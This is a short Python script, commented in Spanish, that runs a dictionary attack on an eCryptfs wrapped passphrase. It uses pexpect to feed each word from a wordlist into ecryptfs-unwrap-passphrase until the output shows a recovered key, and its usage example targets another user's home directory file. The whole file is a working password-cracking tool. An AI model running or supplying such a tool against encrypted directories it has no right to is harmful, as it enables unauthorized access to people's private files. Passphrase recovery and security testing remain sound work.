#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Esto es un script para tratar de romper un passphrase de ecryptfs usando fuerza bruta.

import sys
import pexpect

config = {
    "rtdicc": "../diccionario.txt",
    "ecryptcomm": "ecryptfs-unwrap-passphrase"
}

def probarPalabra(fichpassph, palabra):
    global config
    print("Probando \"{}\"".format(palabra))
    expdor = pexpect.spawn("{0} {1}" .format(config["ecryptcomm"], fichpassph))
    expdor.expect("Passphrase: ")
    expdor.sendline(palabra)
    resp = expdor.expect(["Error: ", "[a-z0-9]{10,}"])
    if resp == 0:
        print("Falló la palabra \"{}\"".format(palabra))
        return False
    else:
        print("La clave \"{}\" fue exitosa.".format(palabra))
        return True

def ataque_diccionario(fichpassph):
    global config
    print("Haciendo el ataque del diccionario")
    # Lee el diccionario.
    roto = False
    with open(config["rtdicc"], "r") as fich:
        for linea in fich:
            palabra = linea.replace("\n", "")
            # Prueba cada palabra en el diccionario.
            roto = probarPalabra(fichpassph, palabra)
            if roto:
                print("Entcontré el passphrase la palabra \"{}\"!!".format(palabra))
                break
        else:
            print("Se probaron todas las palabras disponibles"
                  + " y no se ha podido romper el passphrase")

def main():
    # Revisa los argumentos.
    if len(sys.argv) != 2:
        print("El uso correcto es \"romper-ecryptfs.py"
              + " /home/pedro/.ecryptfs/wrapped-passphrase\"")
        sys.exit(1)
    print("Tratando de romper el passpharse {}.".format(sys.argv[1]))

    ataque_diccionario(sys.argv[1])

if __name__ == "__main__":
    main()
